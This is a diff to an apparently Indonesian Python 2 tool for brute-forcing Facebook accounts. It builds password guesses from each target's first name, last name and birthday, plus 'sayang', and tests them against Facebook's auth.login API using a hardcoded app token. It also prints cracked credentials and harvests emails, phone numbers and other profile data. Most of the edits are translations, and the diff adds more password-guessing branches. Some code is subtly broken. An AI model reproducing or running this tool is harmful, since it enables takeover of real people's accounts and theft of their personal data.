@@ -19,7 +19,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]
 
 
 def keluar():
@@ -33,7 +33,7 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo = " \x1b[1;97m█████████\n \x1b[1;97m█▄█████▄█         \x1b[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;97m█ \x1b[1;91m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;97m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;97m█ \x1b[1;91m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;97m█████████         \x1b[1;96m«==========✧==========»\n \x1b[1;97m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m The Magizz  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/TheMagizz\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/rizz.magizz\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'
+logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m The Magizz  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/TheMagizz\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/rizz.magizz\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'
 
 def tik():
     titik = [
@@ -195,7 +195,7 @@ def pilih():
                             print logo
                             print 52 * '\x1b[1;97m\xe2\x95\x90'
                             os.system('git pull origin master')
-                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                             menu()
                         else:
                             if zedd == '6':
@@ -206,7 +206,7 @@ def pilih():
                                 if zedd == '0':
                                     keluar()
                                 else:
-                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak Tersedia'
+                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mNot availabel'
                                     pilih()
 
 
@@ -233,42 +233,42 @@ def informasi():
             z = json.loads(r.text)
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             try:
-                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m          : ' + z['name']
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
             except KeyError:
-                print '\x1b[1;91m[?] \x1b[1;92mName\x1b[1;97m          : \x1b[1;91mNot found'
+                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak Ada'
             else:
                 try:
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                 except KeyError:
-                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mNot found'
+                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak Ada'
                 else:
                     try:
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                     except KeyError:
-                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mNot found'
+                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak Ada'
                     else:
                         try:
-                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPhone Number\x1b[1;97m  : ' + z['mobile_phone']
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor Telpon\x1b[1;97m  : ' + z['mobile_phone']
                         except KeyError:
-                            print '\x1b[1;91m[?] \x1b[1;92mPhone Number\x1b[1;97m  : \x1b[1;91mNot found'
+                            print '\x1b[1;91m[?] \x1b[1;92mNomor Telpon\x1b[1;97m  : \x1b[1;91mNot found'
 
                         try:
-                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLocation\x1b[1;97m      : ' + z['location']['name']
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m      : ' + z['location']['name']
                         except KeyError:
-                            print '\x1b[1;91m[?] \x1b[1;92mLocation\x1b[1;97m      : \x1b[1;91mNot found'
+                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m      : \x1b[1;91mTidak Ada'
 
                     try:
-                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mBirthday\x1b[1;97m      : ' + z['birthday']
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLahir\x1b[1;97m      : ' + z['birthday']
                     except KeyError:
-                        print '\x1b[1;91m[?] \x1b[1;92mBirthday\x1b[1;97m      : \x1b[1;91mNot found'
+                        print '\x1b[1;91m[?] \x1b[1;92mLahir\x1b[1;97m      : \x1b[1;91mTidak Ada'
 
                 try:
-                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSchool\x1b[1;97m        : '
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m        : '
                     for q in z['education']:
                         try:
                             print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                         except KeyError:
-                            print '\x1b[1;91m                   ~ \x1b[1;91mNot found'
+                            print '\x1b[1;91m                   ~ \x1b[1;91mTidak Ada'
 
                 except KeyError:
                     pass
@@ -276,7 +276,7 @@ def informasi():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
     else:
-        print '\x1b[1;91m[\xe2\x9c\x96] User not found'
+        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna Tidak Ada'
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         menu()
 
@@ -298,8 +298,8 @@ def menu_hack():
     print '║-> \x1b[1;37;40m2. Multi Bruteforce Facebook'
     print '║-> \x1b[1;37;40m3. Super Multi Bruteforce Facebook'
     print '║-> \x1b[1;37;40m4. BruteForce (\x1b[1;92mTarget\x1b[1;97m)'
-    print '║-> \x1b[1;37;40m5. Yahoo Checker'
-    print '║-> \x1b[1;37;40m6. Get ID/Email/HP'
+    print '║-> \x1b[1;37;40m5. Yahoo Clone'
+    print '║-> \x1b[1;37;40m6. Ambil ID/Email/HP'
     print '║-> \x1b[1;31;40m0. Back'
     print '\x1b[1;37;40m║'
     hack_pilih()
@@ -350,7 +350,7 @@ def mini():
         os.system('clear')
         print logo
         print 52 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[ INFO ] Target Harus Berteman Dengan Anda !'
+        print '\x1b[1;91m[ INFO ] Target must be your friend !'
         try:
             id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
@@ -358,9 +358,9 @@ def mini():
             a = json.loads(r.text)
             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
             jalan('\x1b[1;91m[+] \x1b[1;92mChecking \x1b[1;97m...')
-            time.sleep(2)
+            time.sleep(1)
             jalan('\x1b[1;91m[+] \x1b[1;92mOpen security \x1b[1;97m...')
-            time.sleep(2)
+            time.sleep(1)
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             pz1 = a['first_name'] + '123'
@@ -423,8 +423,8 @@ def mini():
                                     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                     menu_hack()
                                 else:
-                                    birthday = a['birthday']
-                                    pz4 = birthday.replace('/', '')
+                                    lahir = a['birthday']
+                                    pz4 = lahir.replace('/', '')
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     y = json.load(data)
                                     if 'access_token' in y:
@@ -445,7 +445,7 @@ def mini():
                                             menu_hack()
                                         else:
                                             pz5 = ('sayang')
-                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                             y = json.load(data)
                                             if 'access_token' in y:
                                                 print '\x1b[1;91m[+] \x1b[1;92mFounded.'
@@ -469,7 +469,7 @@ def mini():
                                                     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                     menu_hack()
         except KeyError:
-            print '\x1b[1;91m[!] Terget Tidak Ditemukan'
+            print '\x1b[1;91m[!] Terget not found'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu_hack()
 
@@ -482,7 +482,7 @@ def crack():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token Tidak Ada'
+        print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -504,7 +504,7 @@ def crack():
                 zedd.join()
 
         except IOError:
-            print '\x1b[1;91m[!] File Tidak Ada'
+            print '\x1b[1;91m[!] File not found'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu_hack()
 
@@ -579,9 +579,9 @@ def super():
     os.system('clear')
     print logo
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    print '║-> \x1b[1;37;40m1. Crack Dari Teman'
-    print '║-> \x1b[1;37;40m2. Crack Dari Grup'
-    print '║-> \x1b[1;37;40m3. Crack Dari File'
+    print '║-> \x1b[1;37;40m1. Crack from Friends'
+    print '║-> \x1b[1;37;40m2. Crack from Group'
+    print '║-> \x1b[1;37;40m3. Crack from File'
     print '║-> \x1b[1;31;40m0. Kembali'
     print '\x1b[1;37;40m║'
     pilih_super()
@@ -633,7 +633,7 @@ def pilih_super():
                         for line in open(idlist,'r').readlines():
                         	id.append(line.strip())
                     except IOError:
-                        print '\x1b[1;91m[!] File Tidak Ada'
+                        print '\x1b[1;91m[!] File not found'
                         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                         super()
 
@@ -644,12 +644,12 @@ def pilih_super():
                         print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                         pilih_super()
     print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
     titik = ['.   ', '..  ', '... ']
     for o in titik:
         print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
         sys.stdout.flush()
-        time.sleep(1)
+        time.sleep(0.5)
 
     print
     print 52 * '\x1b[1;97m\xe2\x95\x90'
@@ -663,47 +663,56 @@ def pilih_super():
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1 + ' => ' + b['name']
+                    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1 + ' ==> ' + b['name']
                 else:
                     if 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1 + ' => ' + b['name']
+                        print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1 + ' ==> ' + b['name']
                     else:
                             pass2 = b['firs_name'] + '12345'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2 + ' => ' + b['name']
+                                print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2 + ' ==> ' + b['name']
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2 + ' => ' + ['name']
+                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2 + ' ==> ' + ['name']
                                 else:
                                         pass3 = b['last_name'] + '123'
                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                         q = json.load(data)
                                         if 'access_token' in q:
-                                            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3 + ' => ' + b['name']
+                                            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3 + ' ==> ' + b['name']
                                         else:
                                             if 'www.facebook.com' in q['error_msg']:
-                                                print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3 + ' => ' + b['name']
+                                                print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3 + ' ==> ' + b['name']
                                             else:
-                                                    birthday = b['birthday']
-                                                    pass4 = birthay.replace('/', '')
+						    pass4 = b['last_name'] + '12345'
                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                     q = json.load(data)
                                                     if 'access_token' in q:
-                                                        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4 + ' => ' + b['name']
-                                                    else:
+                                                        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4 + ' ==> ' + b['name']
+                				    else:
                                                         if 'www.facebook.com' in q['error_msg']:
-                                                            print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4 + ' => ' + b['name']
-                                                        else:
-                                                            pass5 = b['sayangku'] + '123'
-                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                            q = json.load(data)
-                                                            if 'access_token' in q:
-                                                                print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass5 + ' => ' + b['name']
-                                                            else:
-                                                                if 'www.facebook.com' in q['error_msg']:
-                                                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5 + ' => ' + b['name']
+                                                            print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4 + ' ==> ' + b['name']
+                    					else:
+                                                                birthday = b['birthday']
+                                                                pass5 = birthday.replace('/', '')
+                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                q = json.load(data)
+                                                                if 'access_token' in q:
+                                                                    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass5 + ' ==> ' + b['name']
+                                                                else:
+                                                                    if 'www.facebook.com' in q['error_msg']:
+                                                                        print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5 + ' ==> ' + b['name']
+                                                                    else:
+                                                                            pass6 = ('sayang')
+                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                            q = json.load(data)
+                                                                            if 'access_token' in q:
+                                                                                print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' + b['name']
+                                                                            else:
+                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' + b['name']
 
         except:
             pass
@@ -722,7 +731,7 @@ def brute():
     except IOError:
         print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
-        time.sleep(1)
+        time.sleep(0.5)
         login()
     else:
         os.system('clear')
@@ -810,8 +819,8 @@ def menu_yahoo():
     os.system('clear')
     print logo
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    print '║-> \x1b[1;37;40m1. Dari Teman'
-    print '║-> \x1b[1;37;40m2. Dari File'
+    print '║-> \x1b[1;37;40m1. From Friends'
+    print '║-> \x1b[1;37;40m2. From File'
     print '║-> \x1b[1;31;40m0. Back'
     print '\x1b[1;37;40m║'
     yahoo_pilih()
@@ -2193,4 +2202,3 @@ def gaz(toket, enable=True):
 if __name__ == '__main__':
 	login()
 
-   
